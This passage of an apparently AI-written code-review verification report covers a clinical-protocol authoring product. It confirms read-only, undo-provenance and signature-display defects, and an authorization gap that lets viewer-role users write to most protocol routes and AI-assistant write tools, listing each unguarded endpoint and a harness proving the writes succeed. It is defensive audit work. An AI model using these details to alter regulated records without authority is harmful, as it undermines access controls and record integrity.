   - :1886 `{full && boot.mode === 'rich' && !readOnly && (` for the ribbon;
   - :2689 `{autosaveMs == null && !readOnly && showSaveButton && (` for "Save (⌘S)";
   - :2581 for "Draft with AnA";
   - :2557 `readOnly={readOnly}` on the source-mode textarea.

   No context, wrapper, `inert` or CSS rule gates any of this.
2. **Verdict rows are ordinary on this surface.**
   - The list is unfiltered (coauthor.ts:99–104).
   - "Place into filing" (AuthoringPlaceIntoFiling.tsx:247–260) creates a copy whose status the server derives as `state === 'APPROVED' ? 'approved' : state === 'FROZEN' ? 'finalized' : 'draft'` (coauthor-snapshot.ts:103).
   - CMC placement inserts `status: 'approved'` (place-module3-into-submission.ts:215).
   - The repo's own test states it: "The Co-Author surface opens approved documents in the same editor, so an author CAN hit that refusal in normal use" (test :5–7). It waits for an enabled Save button on an approved row (:112–118), and it passes at HEAD. That is runtime proof of the finding.
3. **The server refuses correctly, after the fact.**
   - `saveContent` sends `{ content: serialized }` (EctdCoauthor.tsx:360–364).
   - The PUT passes `governed: { title, content }` (coauthor.ts:327–332).
   - coauthor-status-write.ts:286–288 then refuses: `if (editsGoverned && isCoauthorVerdictStatus(current.status)) { return { ok: false, refusal: coauthorReadOnlyRefusal(current.status) }; }`, with `httpStatus: 409` and `error: 'FINALIZED_DOCUMENT_READ_ONLY'` (:208–210).
   - The verdict set is `approved | finalized` (leaf-source-resolver.ts:140) plus `signed | locked` (:95).
4. **The surface invites the edit.**
   - On an approved row it still renders the eyebrow `'What §… needs before it can promote'` (:914) and `secondary="Or keep drafting — the artifact reflects the saved document."` (:922).
   - The only lock signal comes after saving: `Not saved — {saveError}. Your text is kept on this device; the record is unchanged.` (:940–944).
   - The sibling host does it properly: DocumentWorkbench.tsx:3834 sets `readOnly={docSealed}`, with a frozen banner at :3747–3754.
5. **Why not higher, and one nuance.**
   - The record cannot change, the refusal is honest, the status is printed before any edit (:659, :670–673, and :915 "is **approved**"), and the text is kept on the device (RichSectionEditor.tsx:322).
   - The nuance: only `approved` and `finalized` are produced today; nothing in `server/` writes `signed` or `locked` to this table. The client's `statusToken` (EctdCoauthor.tsx:149–155) maps those two to 'todo', so it must not be the source of the read-only decision.

**If confirmed, the smallest correct fix:**
1. **Take the read-only decision from the server, once.** Have the server add `readOnly: isCoauthorVerdictStatus(status)` to each row returned by GET `/api/coauthor/documents`, GET `/:id` and the PUT response. `coauthor.ts` already imports from `coauthor-status-write.js`. Then pass `readOnly={activeDoc.readOnly === true}` at EctdCoauthor.tsx:945.
   - The report's `['approved','finalized','signed','locked'].includes(String(status).toLowerCase())` is another hand-kept copy of the vocabulary, with a different normaliser. It lower-cases but does not trim.
   - The server trims: `normalizeCoauthorStatus` is `(status ?? '').trim().toLowerCase()` (coauthor-status-write.ts:107–109). That module's header (:70–73) records exactly this kind of client/server split as a past bug (`'approved\t'`). If the check stays client-side, it must trim.
2. **Say it before the edit.** When read-only, show a role="status" banner above the canvas, mirroring DocumentWorkbench.tsx:3747–3754. It should name the status and the only path: re-place the source authoring document. For read-only rows, drop the "before it can promote" and "Or keep drafting" copy (:914, :922).
3. **What the report's fix misses: `readOnly` alone does not neutralise the device cache.**
   - Neither the restore offer (RichSectionEditor.tsx:1095–1104, 1871–1880) nor ⌘S (:1482–1484) checks `readOnly`.
   - A `dc::coauthor:<id>` draft left by today's refused saves will still be offered on the read-only canvas.
   - "Restore" runs `editor.commands.setContent`. TipTap's setContent does not check `isEditable`, and `Editor.ts` emits `update` whatever the editable state, so the buffer becomes dirty.
   - A dirty buffer makes AnA's open-document and open-tab handlers refuse with "save first" (EctdCoauthor.tsx:445–452, 471–478) on a document that cannot be saved, and ⌘S sends the refused PUT again.
   - Fix: gate both on `!readOnly` (offer Discard only), and mask the dirty flag when read-only, as DocumentWorkbench.tsx:871 does (`editorDirty && !docSealed`).
4. **The report's fix breaks `ectdCoauthorFinalizedRefusal.test.tsx` and does not say so.** The test needs an enabled "Save (" on an approved row (:112–118). With `readOnly` set, that control is not rendered (RichSectionEditor.tsx:2689). Replace it with two tests:
   - (a) an approved or finalized row renders with no ribbon, no Save, `isEditable === false`, and the banner. Show it failing at HEAD first.
   - (b) keep the 409-message assertion for the case the fix leaves open: a row loaded in a working state that becomes a verdict while it is open. The list is read once (EctdCoauthor.tsx:266–292), so the server refusal is still the only guard there.

---

## Verification of P11-B-4
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. The trigger is narrow (Undo straight after an Accept or Reject), and the section text, its exports and the freeze gate all stay truthful. It is still at the top of medium: for AnA drafts, the same undo leaves a stale accepted-author entry that the next save writes permanently into the append-only revision ledger ("AI draft accepted") and into the filing's `draft_source`, and the report missed this.

**What I checked:**
- **Editor (client):**
  - `client/src/concept2cure/v2/editor/suggestions.ts` 39-51, 552-645, 686-741, 773-876, 897-910.
  - `RichSectionEditor.tsx` 217-227, 548-554, 723-784, 952-996, 1176-1179, 1389-1407, 1480-1492, 1790-1803, 2072-2077, 2107-2157.
  - `DocumentWorkbench.tsx` 168-173, 205-269, 748-767, 899-955, 1976-2129, 2672-2759, 3785-3926, 4084-4112, 4265-4266, 5028-5133.
- **Server:**
  - `server/routes/authoring.router.ts` 659-752, 1646-1661, 1790-1813, 1861-1937, 3785-3827, 5906-6145.
  - `authoring-evidence.ts` 139-250, `revision-ledger.ts` 154-240, `commit-section-to-filing.ts` 220-251, `machine-attribution.ts` 1-200, `lineage-gate.ts` 128-164.
  - `server/middleware/authoringObjectAuthorization.ts` 142-172.
- **Installed libraries (TipTap 3.31.3):** `prosemirror-history/src/history.ts:259-298`, `@tiptap/extensions/src/undo-redo/undo-redo.ts:77`, `@tiptap/starter-kit/src/starter-kit.ts:223-224`, `@tiptap/extension-collaboration/src/collaboration.ts:128-169`, `@tiptap/y-tiptap/dist/y-tiptap.js:2094-2100`.
- **Tests:** `authoringUnsavedWork.test.tsx:346-485` and `trackedChangeDecisions.test.ts`. No test anywhere covers undo after a decision.
- **Greps:**
  - `addToHistory` has zero hits in `client/src`.
  - Decisions are written only by the two POST routes. They are read only by a GET that no client calls.
  - `track={` appears only at `DocumentWorkbench.tsx:3850`, so the defect is limited to the Authoring host.
- **Places a guard could have been, and is not:**
  - The resolve commands do not exclude themselves from history.
  - `onKeyDown` does not intercept ⌘Z.
  - The tracking plugin sees `history$` and returns null.
  - `UnsavedWorkGuard` only appears when the canvas is dirty.
  - `PATCH /sections/:sectionId` never touches decisions.
  - `authoringObjectAuthorization` only checks authorization.
  - The freeze gate flags the pending change but does not reconcile it.
- **Executed:** a headless TipTap harness outside the repo, `<scratch>/p11b4/check.ts`. It drives the shipped `suggestions.ts` and two patched copies of it kept in the scratchpad.
- **Repository state:** the cited files are identical at 7087f46e2 and at HEAD 10ad41a2. I changed no repository file. The working-tree edits to `ProtocolDev*.tsx` (03:08 UTC) come from a concurrent session, not from me.

**Why:**
1. **Undo is possible after a decision.**
   - The resolve command reports the decision (`suggestions.ts:796` `notifyResolved(this.options.onResolve, range, action);`) and then only sets `tr.setMeta(SUGGESTION_ACTION_META, true); if (dispatch) dispatch(tr);` (`:805-806`).
   - `prosemirror-history` records every transaction unless `addToHistory` is false (`history.ts:277` `} else if (tr.getMeta("addToHistory") !== false && …`).
   - StarterKit's UndoRedo binds `'Mod-z': () => this.editor.commands.undo()` (`undo-redo.ts:77`). Under live co-editing it is switched off (`RichSectionEditor.tsx:737-738` `...(collabRuntime ? { undoRedo: false } : {})`), and Collaboration binds the same key (`collaboration.ts:167`) to a Yjs UndoManager with `captureTransaction: tr => tr.meta.get('addToHistory') !== false` (`y-tiptap.js:2099`).
   - The editor's `onKeyDown` handles only `'s'` and `'f'/'F'` (`RichSectionEditor.tsx:1482,1485`), and the ribbon's Undo button is unconditional (`:2072`).
   - The tracking plugin lets the undo through untouched (`suggestions.ts:907` `!tr.getMeta('history$')`), and `onUpdate` re-counts the restored suggestion (`RichSectionEditor.tsx:962`).
2. **The decision is saved immediately, whether or not the section is saved.**
   - The client posts it on the next microtask (`DocumentWorkbench.tsx:2752-2755` `queueMicrotask(…) … void flushDecisions(activeDocId, batch)`), to `POST …/tracked-change-decisions` (`:2694-2697`).
   - The server upserts the decision row (`authoring.router.ts:5974-5975` `ON CONFLICT … DO UPDATE SET decision = $3`) and writes `createAuditEvent(artifactId, 'tracked_change_decision', …)` (`:5988-5990`): an `authoring_audit_trail` row plus a chained `audit_logs` index row (`authoring-evidence.ts:147-156`).
   - Nothing posts anything when the decision is undone.
3. **No later save reconciles it, and the product's own disclosure misses this path.**
   - The PATCH handler reads only content, metadata and accepted authors (`authoring.router.ts:1650-1661`). It has no reference to decisions.
   - Saving only zeroes a client-side counter (`DocumentWorkbench.tsx:2067`), under a comment that is false after an undo: "This save just persisted whatever content reflects any decisions made since the section was last saved" (`:2063-2064`).
   - The team knows this class of gap: "the audit trail permanently records N acceptances while the saved section still shows them pending" (`:761-763`). But they disclose it only in `UnsavedWorkGuard`, which appears only when the canvas is dirty (`:920-923` `if (!dirty) { applyNav(target); return true; }`). Accept then Undo returns the canvas to its saved baseline, so the guard never appears, and `applyNav` zeroes the count (`:906`).
   - Later, the freeze gate describes the change as one "nobody has accepted or rejected" (`authoring.router.ts:3804`), while the audit rail says "accepted".
4. **Executed on the shipped code.**
   - **S1, a saved AnA `<ins>`:** after Accept there is 1 decision (accept) and 0 pending suggestions. After ⌘Z (undo ran = true) there is still 1 decision (accept) but 1 pending suggestion, the canvas equals the saved baseline (not dirty), and `acceptedAuthors=["ana"]`.
   - **S3, a misclick recovery (Accept, then ⌘Z, then Reject):** the decisions are accept and reject, and the AnA text is gone. Even so, `acceptedAuthors` is still `["ana"]`.
5. **The report understates the impact.**
   - The report says the "primary revision/audit trail" is "computed at Save time from the live, post-undo document state". That is wrong for provenance.
   - `rememberAcceptedAuthor` adds the author on Accept (`suggestions.ts:640-644`). Undo does not touch the extension's stored list, and the list is cleared only when a save reads it (`RichSectionEditor.tsx:1389-1407`).
   - The next save sends that list (`DocumentWorkbench.tsx:2003-2026`). The server then:
     - stamps the revision `contributors.length ? 'ai-draft-accept' : 'human-edit'` (`authoring.router.ts:1879`);
     - writes `draftSource` (`:1917`) into the filing section as `draft_source = $5::text` (`commit-section-to-filing.ts:243`);
     - passes the text to the lineage gate as accepted (`:1892-1899`). I established the lineage outcome by reading only.
   - The History rail shows `'AI draft accepted'` for that revision (`DocumentWorkbench.tsx:171`). This happens even in S3, where the AnA text was rejected, so the trigger is wider than "never re-decide".

**If confirmed, the smallest correct fix:**
- **The fix itself:** add `tr.setMeta('addToHistory', false)` beside `tr.setMeta(SUGGESTION_ACTION_META, true)` in three commands in `suggestions.ts`: `resolveSuggestion` (:805), `resolveAllSuggestions` (:829) and `insertSuggestedContent` (:873).
  - Both undo engines honour this flag (`history.ts:277`, `y-tiptap.js:2099`).
  - I ran it on the scratch copies. With all three lines, undo does nothing in S1, S2 and S3, and the decision record, the document and `acceptedAuthors` agree.
  - The UX cost: a mistaken AnA insert can no longer be removed with ⌘Z. Rejecting it is the way out, and the rejection is recorded.
- **Where the report's fix is wrong or incomplete:**
  - **(a) `insertSuggestedContent` is required, not optional.** With the flag on the two resolve commands only, the next ⌘Z undoes the AnA insertion itself and deletes the text that was just accepted. I ran this: the text reverts to "Base text.", and the "accept" event and `["ana"]` are left behind.
  - **(b) One gap remains even with the full fix.** A reviewer's own tracked typing from the same session can still be undone. So Accept then ⌘Z deletes the accepted text while the "accept" event stands (ran as S4). Two ways to close it:
    - send decisions with the save that carries their effect: only those whose change id is no longer pending in the saved document, written in the PATCH transaction;
    - or post a compensating "withdrawn" event whenever an undo or remote-sync transaction makes a decided change reappear or disappear. This generalizes the report's "explicit action" idea.
  - **(c) Harden `takeAcceptedAuthors` and `takeAcceptedInsertions`.** Drop entries whose text is not present, unmarked, in the content being saved, so no path can put a stale machine contributor into the ledger.
  - **(d) Pin it with a test that fails today:** mount a saved `<ins data-author-id="ana">`, run `resolveSuggestion(…, 'accept')`, then `undo()`, and assert `collectSuggestions(doc).length === 0`. The shipped code returns 1.

---

## Verification of P11-C-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** blocker. The product's own role model makes `viewer` read-only (`server/middleware/orgMembership.ts:484`, "a viewer reads, everyone else in the organization can work"; `server/middleware/auth.ts:370`, "viewer → nothing (read-only is the point)"). Yet a viewer can change a regulated protocol's cover page, sections, SoA, risk ratings, deviation severity and safety assessment, budget, study-design link and reviewers, and the server commits and ledgers each change as a legitimate governed action. That is a regulated record changed without the §11.10(g) authority check the product claims.

**What I checked:** All at `7087f46e2`. The later commits (`26fbf978`, `185bbbb0`) change nothing under `server/`.
- **Mounts.** `server/bootstrap/register-inline-routes.ts:592,601,621,630,729,738` use `authMiddleware` only. So do the sibling protocol routers: `:612` amendments, `:639` consent, `:702` templates, `:711` milestones. No other mount covers these prefixes; the `'/api/protocol'` mount at `register-clinical-intel-routes.ts:92` does not match `/api/protocol-*`.
- **Routes.** I checked every write in the six routers:
  - `protocol-development.ts` has 16 writes and gates only `:496` (finalize).
  - `protocol-reviews.ts` has 4 and gates only `:165` (disposition).
  - Ungated: `protocol-risks.ts:85,105`; `protocol-deviations.ts:98,124,161,174,187`; `protocol-soa.ts:57,70,81`; `protocol-budget.ts:58,71`.
  - No router uses `router.use`. The routers' private `governed()`/`governedScoped()` helpers check only userId and orgId (`protocol-development.ts:102-107,142-147`).
- **Auth chain.** None of these checks the caller's role for a write:
  - `server/auth.ts:186-340`: reads the role at `:262`, sets `req.userRole` at `:278`, then chains `enforceOrgMembership → establishRequestTenantScope → enforceTenantLifecycle → enforceStorageQuota` (`:322-328`).
  - `orgMembership.ts:364-424` checks membership only.
  - `establishRequestTenantScope.ts:201-278` sets the tenant scope and session variables only.
  - `tenantLifecycleGuard.ts:12` states it "is not an authorization control".
  - `authBoundary.ts:155-220` authenticates only.
  - The global gate at `register-platform-routes.ts:245-278` calls `authMiddleware`.
  - `authoringObjectAuthorization.ts:23-26` applies to `/authoring` paths only.
  - `betaRouteFence.ts:3-9` does not fence protocol prefixes.
  - CSRF (`enterprise-security.ts:944-1003`) and the immutability policy (`startup/middleware.ts:224-249`) do not look at role.
- **Ledger and tenant helpers.** `recordGovernedAction` (`routes/c2c/actions.ts:341-434`) takes no role. `setTenantContextTx` (`governed-tenant-context.ts:25-29`) only sets session variables.
- **RLS.** `migrations/0021_enable_rls_everywhere.sql:207-221` and `20260612_rls_research_admin.sql:67-79` match the tenant or `app_super_admin` only. There is no role-based write policy and no trigger on any `protocol_*` table.
- **Services.** No write function checks the caller's role:
  - `protocol-development-service.ts` has only `assertEditable`, a status check (`:88-90`).
  - `protocol-risks-service.ts:41-80`, `protocol-soa-service.ts:28-59`, `protocol-budget-service.ts:29-53` and `protocol-deviations-service.ts:128-150` have no role check.
  - `protocol-reviews-service.ts:60-74` checks the assignee's role, not the caller's.
- **Entitlements and CI.** No module-entitlement guard sits on these mounts. No CI check or test covers write roles here; the only viewer tests are the two signing tests (`protocol-signatures.routes.test.ts:180,303`).
- **Client.** `ProtocolDevWorkspace.tsx:316-318` sets `canWrite` from the numeric id only; `ProtocolDevSoa.tsx:243` and `ProtocolDevSection.tsx:87` build on it.
- **AnA path.** Checked `AnaToolExecutor.ts:339-358`, the protocol write handlers, `register-ai-routes.ts:35` and `ana-ri/utility.ts:222-245,558-700`.
- **Dynamic proof.** Scratchpad only: `…/scratchpad/editor-review/proof-P11-C-1/viewer-write.test.ts`, run against `git show 7087f46e2:` copies of the six routers; 9 of 9 pass.
  - Harness: a fake DB client, a stubbed ledger, and a stub that sets the same identity fields `authMiddleware` sets. The substitution is faithful because `authMiddleware` has no role logic.
  - As `viewer`, each of these returns 201 with `BEGIN, WRITE …, LEDGER …, COMMIT`:
    - PATCH `/api/protocol-risks/risks/9`
    - POST `/api/protocol-soa/cells`
    - POST `/api/protocol-budget/documents/5/items`
    - POST `/api/protocol-deviations/deviations/6/assessment`
    - PATCH `/api/protocol-development/documents/5`
    - POST `/api/protocol-reviews/documents/5/reviewers`
  - POST `…/documents/5/finalize` returns 403 `Insufficient permissions` and writes nothing.
  - The same committed risks router behind a method-aware `requireEditorAccess` refuses the viewer (403) and admits a member (201), so the harness does detect a gate when one exists.

**Why:**
- **Role gating here is opt-in per route, and only the two signing routes opt in.**
  - Gated: `protocol-development.ts:496: router.post('/documents/:id/finalize', requireEditorAccess, signingAttempts, …` and `protocol-reviews.ts:165: router.patch('/assignments/:id/disposition', requireEditorAccess, signingAttempts, …`.
  - Every other write is bare, for example `protocol-risks.ts:105: router.patch('/risks/:id', async (req, res) => {`, `protocol-soa.ts:70: router.post('/cells', async (req, res) => {` and `protocol-development.ts:242: router.patch('/documents/:id', async (req, res) => {`.
  - That is 2 gated writes out of 32 in these six routers.
- **The gate that would refuse a viewer exists but is not applied.** `orgMembership.ts:533: if (!role || !GOVERNED_WRITE_ROLES.has(role)) { return res.status(403)…`, with `GOVERNED_WRITE_ROLES` at `:503-511` excluding `viewer`.
- **The route files' own comment confines it to signing.** `protocol-development.ts:60`: "A viewer cannot sign (requireEditorAccess, 21 CFR 11.10(g))". The gate was intended as the §11.10(g) control and was applied to signing only.
- **Nothing upstream substitutes for it.**
  - `authMiddleware` stores the role (`auth.ts:278: req.userRole = resolvedRole;`) and never tests it.
  - The RLS policy's only role clause is `current_setting('app.current_user_role', TRUE) = 'app_super_admin'` (`0021_enable_rls_everywhere.sql:215`).
  - `recordGovernedAction` records whatever `userId` it is given.
- **`viewer` is a real, grantable role.** `server/routes/tenant-users.ts:25: role: z.enum(['admin', 'manager', 'member', 'viewer'])`.
- **Aggravating, beyond the finding.**
  - `updateRiskTx`, `addAssessmentTx`, `setCellTx`, `clearCellTx`, `addBudgetItemTx` and `setBudgetParamsTx` never call `loadDoc`/`assertEditable`. The ungated viewer write therefore also lands on a finalized protocol's risk, SoA and budget registers.
  - The report's statement that finalized content is "comprehensively enforced at the service layer" holds only for `protocol-development-service.ts`.
- **Minor report gap.** Its route list omits synopsis `:220`, versions `:480`, comments `:127`, comment resolve `:140`, POST `/deviations` `:98`, CAPA `:161,174` and close `:187`. All are equally ungated. Its fix wording ("every mutating route" in those files) still covers them.

**If confirmed, the smallest correct fix,** and where the report's fix is wrong or incomplete:
1. **Add one method-aware gate per router, not per route.** Per-route opt-in is how 30 of 32 writes went ungated. At the top of each router, add `router.use((req,res,next) => ['GET','HEAD','OPTIONS'].includes(req.method) ? next() : requireEditorAccess(req,res,next))`. Apply it to protocol-development, risks, deviations, reviews, soa and budget, and also to:
   - **milestones and amendments.** The report's file list omits both, yet the same workspace writes them through `ProtocolRegisterForms.tsx:174,178`, and `protocol-milestones.ts:57,70` and `protocol-amendments.ts:97,159,174` are ungated.
   - **consent** (`:94,135,152`) and **templates** (`:58,69,81,94`), mounted the same way.
2. **Close the AnA path, which the report does not mention.** The AnA protocol write tools call the same services with no role check:
   - `preHandlerRefusal` (`AnaToolExecutor.ts:339-358`) checks only model approval and a person's confirmation.
   - `/api/ana-ri` is mounted with `authenticateToken, aiCircuitBreaker, weeklyRequestLimit` only (`register-ai-routes.ts:35`).
   - Neither `governed-action` (`ana-ri/utility.ts:558`) nor `runConfirmedTool` (`:222`) checks role.
   - The file already documents this hole for QMS ("a viewer included", `:13682-13686`) and has the fix: `editorRoleRefusal` (`:13692`), used by one tool (`:13710`).
   - Call it in `governedPdev` (`:10867`) and in the protocol handlers that open their own client: `add_protocol_risk` `:11428`, `create_protocol_document` `:11477`, `update_protocol_section` `:11509`, `add_protocol_objective` `:11535`, `bind_protocol_to_study_design` `:20533`, `apply_protocol_design_derivation` `:20586`, and the rest. Alternatively, call it once in `preHandlerRefusal` for write-class tools.
3. **Add tests shown failing before the gate.** Per router: viewer gets 403 with zero writes, member gets 201. Add one for an AnA protocol write tool. The scratch proof above has that shape.
4. **Treat the client `canWrite` role check as UX only.** It is not the control.

**Uncommitted change seen during verification (not part of `7087f46e2`):** the working tree has `router.use(requireEditorAccessForWrites)` in all ten protocol routers that have writes, plus `orgMembership.ts` and a new `server/routes/__tests__/protocol-write-authority.routes.test.ts`. It implements point 1. `AnaToolExecutor.ts` is untouched, so point 2 is still open.

---

## Verification of P11-C-2
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. Every §11.50 element is captured correctly and durably in `electronic_signatures`: the printed name as recorded at signing, the time, the meaning, the reason and the content binding. Nothing on screen is false. So this is a §11.50(b) display and printout gap, not a missing or forged record. Still, the protocol's own screen and its MD/DOCX/PDF export carry no signer, time or meaning. The only partial workaround is the admin-only Audit Trail, which shows the signer and the time but not the meaning. That is the same grade the 2026-09-28 review gave the identical defect on gateway transmittals (`docs/evidence/reviews/2026-09-28/part11-ux.md`, Q-0928-3).

**What I checked:**
- **Which tree I read.** Everything was read at `7087f46e2`. HEAD has since moved to `185bbbb0` with docs-only commits. The working tree now holds another session's uncommitted P11-C-1 edits to the protocol route files, so I cite those two routes from `git show 7087f46e2:`. Every other file below is byte-identical to `7087f46e2` (checked with `git diff --quiet`).
- **Read model:**
  - `server/routes/protocol-dev.routes.ts` (whole file).
  - `server/services/protocol-development/pdev-view-assembler.ts` lines 1-120 and 370-672: the docs SELECT at 385-392, the reviews SELECT at 421, `mapReviews` at 54-70, and the returned object at 537-588.
  - `client/src/concept2cure/v2/surfaces/ProtocolDev.tsx:189`, the workspace's only read.
- **Write side:**
  - `protocol-development-service.ts` lines 355-416: finalize at 374-390, list/get at 394-416.
  - `protocol-reviews-service.ts` (whole file): `assertMaySignDisposition` at 99-116, `setDispositionTx` at 123-173.
  - `migrations/20260629_protocol_reviews.sql` (whole file). It is the only .sql file that defines the table.
  - `protocol-signature.ts` (whole file).
  - `signature-persistence.ts` lines 270-400 and 500-927.
  - Routes `protocol-development.ts@7087f46e2` lines 492-530 and `protocol-reviews.ts@7087f46e2` lines 150-205.
- **Client:**
  - `ProtocolDevWorkspace.tsx` (whole file).
  - `ProtocolDevReviews.tsx` lines 1-112.
  - `ProtocolDevSigning.tsx` (whole file).
  - `EsignModal.tsx` lines 340-420.
  - `_shared/signatureMeaning.ts` (whole file).
  - `IrbPackage.tsx` (its API calls).
- **Export:** `server/routes/protocol-export.ts`, `server/services/protocol-export/protocol-export-service.ts` and `protocol-export-logic.ts`, all whole files.
- **Anywhere else a manifestation could appear:**
  - `part11-compliance.ts`: the by-target route at 346-406 and the console's control list at 1150-1190.
  - Repo-wide grep for callers of `by-target`, `signatures/by` and `signed_target`.
  - Client grep for `finalized_at|finalizedAt|finalized_by|finalizedBy`.
  - Data sources of `Part11Console`, `AuthoringSignatures`, `Review`, `DecisionLineage` (plus its view assembler), `TaskBoard`, `EctdCompile` and `GatewayTransmittals`.
  - `AdminSurfaces.tsx` 930-1540 (Audit Trail), `audit-trail-ledger.routes.ts` (whole file), `c2c/actions.ts` 341-434 (`recordGovernedAction`), `audit-api-authority.ts` 26 and 56-74, `registryModel.ts:81`.
  - The project activity feed, `c2c/projects.ts` 1290-1330.
  - The AnA tool `review_protocol_review_status` (`AnaToolExecutor.ts` 11012-11022), plus a grep for any AnA read of protocol signatures.
  - A grep for `onNav(` across `ProtocolDev*`. It finds no link to any audit or signature surface.

**Why:**
1. **The workspace's read model carries no signer.** `pdev-view-assembler.ts:386-387` selects `id, protocol_kind, protocol_number, title, design_type, phase, version, status, updated_at, sponsor, principal_investigator, study_design_id, study_design_linked_at`.
   - `finalized_by` and `finalized_at` are written at `protocol-development-service.ts:388`.
   - They are read only by `listProtocolDocuments` (`:396`, `finalized_at` only) and `getProtocolDocument` (`:404`). The client never calls either GET.
   - A client-wide grep for the four finalized spellings returns nothing.
2. **The review row cannot hold a signer.**
   - The table's columns are id, organization_id, protocol_document_id, reviewer_name, reviewer_user_id, role, status, disposition, due_date, created_by, created_at, updated_at, deleted_at (`20260629_protocol_reviews.sql:17-32`).
   - Signing writes only ``UPDATE protocol_review_assignments SET disposition = $3, status = 'completed', updated_at = now()`` (`protocol-reviews-service.ts:156`). The only incidental time is `updated_at`, which is never selected.
   - The read at `pdev-view-assembler.ts:421` selects `reviewer_name, reviewer_user_id, role, status, disposition, due_date`.
   - `ReviewerRow` prints the assigned name, role, due date and `PG.labelize(disposition)` (`ProtocolDevReviews.tsx:49-55`).
   - When the reviewer has no account, someone else signs as `responsibility` (`protocol-reviews-service.ts:110-114`). The write path records this: `onBehalfOf` at `:171` becomes `recordedOnBehalfOf` at `protocol-reviews.ts@7087f46e2:191`. The row still reads only "<reviewer> · Approve".
3. **The header shows no signature.** It renders `<PG.StatusBadge status={str(doc.status)} />` and `'v' + … + updatedSuffix(doc.updated)` (`ProtocolDevWorkspace.tsx:130,139`). There is no signer, time or meaning.
4. **The modal is the only place the signature is shown.**
   - The modal's done screen (`EsignModal.tsx:365-401`) shows it once.
   - Its printed name comes from the client session (`printedSigner`, `ProtocolDevSigning.tsx:51-55`), not from the persisted `signer_name`.
   - Correction to the report: the toast at `ProtocolDevWorkspace.tsx:497-505` never names the signer. It is `'Protocol finalized' + … + '. Signed' + meaning + '; the signature and the audit entry were recorded with it.'` It gives the meaning and version only, with no name or time.
5. **The printout has no signature block.**
   - The report grepped only the 45-line route file, but its conclusion holds in the service. `protocol-export-service.ts:29` selects `title, protocol_number, protocol_kind, design_type, phase, version, synopsis`, not even `status`.
   - `renderProtocolMarkdown` (`protocol-export-logic.ts:64-85`) emits only title, meta line, synopsis, objectives, eligibility, schedule and sections.
   - DOCX and PDF are rendered from this same Markdown (`ProtocolDevWorkspace.tsx:167-197`).
6. **No signatures panel is reachable.**
   - The signatures are stored under the targets `protocol-document:<id>` (`protocol-development.ts@7087f46e2:508`) and `protocol-review-assignment:<id>` (`protocol-reviews.ts@7087f46e2:177`), persisted as `signedTarget: params.target` (`signature-persistence.ts:761`).
   - `GET /api/part11/signatures/by-target` (`part11-compliance.ts:373`) would return them. Its only callers anywhere in the repo are the route itself and `server/routes/__tests__/part11-signatures-by-target.test.ts`.
   - `Part11Console` reads only chain-integrity, compliance-status and soc2 (`Part11Console.tsx:121-123`). The other signature displays each read their own store.
7. **The nearest thing is not reachable from the protocol and is incomplete.**
   - The admin Audit Trail (`AdminSurfaces.tsx:1017` → `/api/audit-trail/ledger`) lists the `c2c.work.sign` row with the actor (`users.name`), the UTC minute, the raw target and the reason.
   - Its meaning is read from `row.new_values` (`audit-trail-ledger.routes.ts:213,235`). `recordGovernedAction`'s INSERT writes no `new_values` (`c2c/actions.ts:375-379`), so the meaning comes out null and the Sig column shows `--` (`:230`; `AdminSurfaces.tsx:1409`).
   - Only owner, admin and manager roles can read it (`audit-api-authority.ts:26`; `registryModel.ts:81`).
8. **The product's Part 11 console lists this as a platform control.**
   - `part11-compliance.ts:1163`: `'§11.10(b)' … 'PDF export with rendered e-signatures'`.
   - `:1173`: `'§11.50' … 'Name, date/time, and meaning displayed on signature'`. Both are shown as `not_assessed`.
   - This is the strongest argument for grading higher. I stay at medium because nothing displayed is false and the record itself is complete.

**If confirmed, the smallest correct fix:**
- **Read the manifestation from the signature row.** In `assembleOrgPdevDocs`, add one bulk, org-scoped query:
  - `SELECT signed_target, signer_name, signer_email, signed_at, signature_meaning, signature_purpose, is_valid, superseded_by, signature_manifest->'act'->>'recordedOnBehalfOf' FROM electronic_signatures WHERE organization_id=$1 AND signed_target = ANY($2) AND signature_type <> 'governed-revocation'`.
  - `$2` is the `protocol-document:`/`protocol-review-assignment:` targets already in hand. Attach the results as `doc.finalization` and `review.signature`.
  - The join is unambiguous here, unlike the transmittal case. Finalize happens once per protocol: `:376-377` refuses a second one, and `:388` is the only write of `finalized`. A disposition happens once per assignment (`protocol-reviews-service.ts:150-152`).
  - Keep a 42P01 from this query local to the signature facet. If it reaches `protocol-dev.routes.ts`'s 42P01 branch, that branch returns `data: []` and blanks the whole workspace.
- **Show it.**
  - On `ProtocolHeader` when the protocol is finalized: "signed by <signer_name>, <meaning>, <GovernedTimestamp>".
  - On `ReviewerRow`: "Signed by <signer_name> as <meaning> · <time>", plus "recorded on behalf of <reviewer>" when that is set.
  - Show a revoked state when `is_valid` is false or `superseded_by` is set.
  - Show an explicit "no signature on record" for a finalized protocol with no live signature, never silence.
  - Add `RESPONSIBILITY` to `signatureMeaningLabel` (`_shared/signatureMeaning.ts:14-22`). Without it every on-behalf-of disposition prints the raw token.
- **Printout.** `loadAssembled` should read the same rows, and `renderProtocolMarkdown` should emit status plus a signature block: printed name, executed time in UTC, meaning and reason, modelled on `signatureManifestLines` (`server/services/authoring/authoring-export.ts:128`). One change covers MD, DOCX and PDF.
- **Tests.** Add an assembler test and an export test that sign through `signProtocolAct` and assert name, time and meaning. Each must be seen failing before the change.
- **Where the report's fix is wrong or incomplete:**
  - (a) Showing `finalized_by`/`finalized_at` "resolved to a name" has no §11.50(a)(3) meaning. The meaning exists only in `electronic_signatures.signature_meaning` and the ledger payload. It also re-resolves `users.name` at read time, so a later rename would rewrite the manifestation. `signer_name` is the name recorded at signing (`signature-persistence.ts:720-721`).
  - (b) Adding `signed_by/signed_at/meaning` columns to `protocol_review_assignments` creates a second copy. The governed `revoke-signature` (`c2c/actions.ts:813` → `persistGovernedSignatureRevocation`) would never update it, and it breaks the repo's zero-duplication rule. Use the join instead.
  - (c) The report's fix leaves out the export, although its own evidence names it, and §11.50(b) covers printouts.

---

## Verification of P11-C-3
**Verdict:** CONFIRMED

**Severity, as you would grade it:** medium. The ledger rows are written in the same transaction as each write and nothing the surface shows is false. An owner, admin or manager also has a partial workaround through the tenant-wide Audit trail. But an author or reviewer working on the protocol has no path to its history, and `protocol_versions` cannot be reached from any client.

**What I checked:** I read the working tree at `26fbf978`. `git diff 7087f46e2 HEAD` touches only `docs/work-orders/README.md`, so the code is identical to the reviewed commit.

- **Client, protocol workspace:**
